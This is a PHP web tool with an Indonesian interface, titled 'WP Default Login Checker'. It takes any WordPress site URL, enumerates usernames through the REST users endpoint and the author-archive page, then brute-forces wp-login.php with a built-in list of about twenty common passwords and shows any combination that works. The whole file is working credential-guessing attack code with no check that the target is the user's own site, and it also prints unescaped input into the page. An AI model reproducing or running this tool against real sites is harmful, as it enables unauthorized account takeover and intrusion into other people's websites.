<?php
function getUsernameFromTarget($url) {
    $json = @file_get_contents(rtrim($url, '/') . '/wp-json/wp/v2/users');
    $users = @json_decode($json, true);
    if (!empty($users[0]['slug'])) {
        return $users[0]['slug'];
    }

    $check = @file_get_contents(rtrim($url, '/') . '/?author=1');
    if (preg_match('/<title>(.*?)</', $check, $match)) {
        return strtolower(trim(strip_tags($match[1])));
    }

    return false;
}

function tryLogin($url, $username, $password) {
    $loginUrl = rtrim($url, '/') . '/wp-login.php';
    $data = http_build_query([
        'log' => $username,
        'pwd' => $password,
        'wp-submit' => 'Log In',
        'redirect_to' => rtrim($url, '/') . '/wp-admin/',
        'testcookie' => '1'
    ]);
    $opts = [
        'http' => [
            'method' => "POST",
            'header' =>
                "Content-type: application/x-www-form-urlencoded\r\n" .
                "Content-Length: " . strlen($data) . "\r\n",
            'content' => $data
        ]
    ];
    $context = stream_context_create($opts);
    $response = @file_get_contents($loginUrl, false, $context);

    if ($response && isset($http_response_header[0]) && strpos($http_response_header[0], "302") !== false && strpos($response, 'dashboard') !== false) {
        return true;
    }
    return false;
}

$result = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['target'])) {
    $target = $_POST['target'];
    $username = getUsernameFromTarget($target);
    if (!$username) {
        $result = "<span class='text-danger'>Username tidak ditemukan</span>";
    } else {
        $result .= "<div class='text-success'>Username ditemukan: <strong>$username</strong><br>Coba kombinasi default login...</div>";
        $wordlist = [
            'admin','pass','admin123','123456','12345678','123456789','password',
            '123123','qwerty','letmein','test123','welcome','wordpress',
            'wpadmin','root','abc123','user123','1234','pass123','admin@123','password123'
        ];
        foreach ($wordlist as $pass) {
            if (tryLogin($target, $username, $pass)) {
                $result .= "<div class='text-success mt-2'>✅ Login berhasil: <strong>$username:$pass</strong></div>";
                break;
            } else {
                $result .= "<div class='text-muted'>Coba: $username:$pass ... gagal</div>";
            }
            ob_flush(); flush(); // Output streaming
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>WP Default Login Checker</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
  <style>
    body { background-color: #111; color: #eee; font-family: monospace; }
    .container { max-width: 700px; padding-top: 60px; }
  </style>
</head>
<body>
<div class="container">
  <h3 class="mb-4"><i class="bi bi-person-lock text-warning"></i> WP Default Login Checker</h3>
  <form method="POST">
    <div class="input-group mb-3">
      <span class="input-group-text">Target</span>
      <input type="url" name="target" class="form-control" required placeholder="https://example.com">
    </div>
    <button class="btn btn-warning" type="submit">Cek Login</button>
  </form>
  <div class="mt-4">
    <?= $result ?>
  </div>
</div>
</body>
</html>
